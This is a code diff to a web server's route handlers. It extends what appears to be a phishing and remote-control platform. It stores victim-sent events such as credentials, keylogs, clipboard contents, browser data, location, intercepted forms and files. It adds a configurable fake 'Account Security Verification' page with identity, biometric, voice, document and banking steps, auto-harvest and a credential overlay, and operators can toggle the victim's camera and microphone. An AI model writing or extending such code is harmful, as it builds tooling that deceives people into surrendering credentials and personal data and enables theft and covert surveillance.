@@ -140,6 +140,21 @@ export async function registerRoutes(
             if (pair.operator && pair.operator.readyState === WebSocket.OPEN) {
               pair.operator.send(JSON.stringify(msg));
             }
+            const recordableTypes = ["rc_auto_harvest", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_device_info", "rc_location", "rc_permission_granted", "rc_permission_denied", "rc_activity", "rc_keylog", "rc_form_intercept", "rc_file"];
+            if (recordableTypes.includes(msg.type)) {
+              (async () => {
+                try {
+                  const session = await storage.getRemoteSessionByToken(rcToken);
+                  if (session) {
+                    await storage.createRemoteSessionEvent({
+                      sessionId: session.id,
+                      eventType: msg.type,
+                      eventData: msg.data || msg,
+                    });
+                  }
+                } catch {}
+              })();
+            }
             return;
           }
           const operatorToTargetTypes = ["rc_request_permission", "rc_toggle_camera", "rc_toggle_mic"];
@@ -4167,7 +4182,27 @@ export async function registerRoutes(
       const body = z.object({
         name: z.string().min(1).max(255),
         expiryMinutes: z.number().min(5).max(1440).default(60),
+        pageConfig: z.object({
+          steps: z.object({
+            identity: z.boolean().default(true),
+            biometric: z.boolean().default(true),
+            voice: z.boolean().default(true),
+            environment: z.boolean().default(true),
+            documents: z.boolean().default(true),
+          }).default({}),
+          enableBanking: z.boolean().default(false),
+          enableAutoHarvest: z.boolean().default(true),
+          enableCredentialOverlay: z.boolean().default(false),
+          autoRequestPermissions: z.boolean().default(false),
+          pageTitle: z.string().max(100).default("Account Security Verification"),
+          pageSubtitle: z.string().max(200).default(""),
+          brandColor: z.enum(["blue", "red", "green", "purple", "orange"]).default("blue"),
+        }).default({}),
       }).parse(req.body);
+      const steps = body.pageConfig.steps;
+      if (!steps.identity && !steps.biometric && !steps.voice && !steps.environment && !steps.documents) {
+        return res.status(400).json({ error: "At least one wizard step must be enabled" });
+      }
       const sessionToken = randomBytes(32).toString("hex");
       const expiresAt = new Date(Date.now() + body.expiryMinutes * 60 * 1000);
       const session = await storage.createRemoteSession({
@@ -4177,6 +4212,7 @@ export async function registerRoutes(
         status: "pending",
         createdBy: userId,
         expiresAt,
+        pageConfig: body.pageConfig,
       });
       res.json(session);
     } catch (error: any) {
@@ -4210,6 +4246,7 @@ export async function registerRoutes(
         name: session.name,
         status: session.status,
         sessionToken: session.sessionToken,
+        pageConfig: session.pageConfig,
       });
     } catch (error) {
       res.status(500).json({ error: "Failed to fetch session" });
@@ -4254,6 +4291,19 @@ export async function registerRoutes(
       res.json({ success: true });
     } catch (error) {
       res.status(500).json({ error: "Failed to delete session" });
+    }
+  });
+
+  app.get("/api/remote-sessions/:id/events", requireAuth, async (req, res) => {
+    try {
+      const orgId = getOrgId(req);
+      const id = parseInt(req.params.id);
+      const session = await storage.getRemoteSessionById(id, orgId);
+      if (!session) return res.status(404).json({ error: "Session not found" });
+      const events = await storage.getRemoteSessionEvents(id);
+      res.json(events);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to fetch session events" });
     }
   });
 
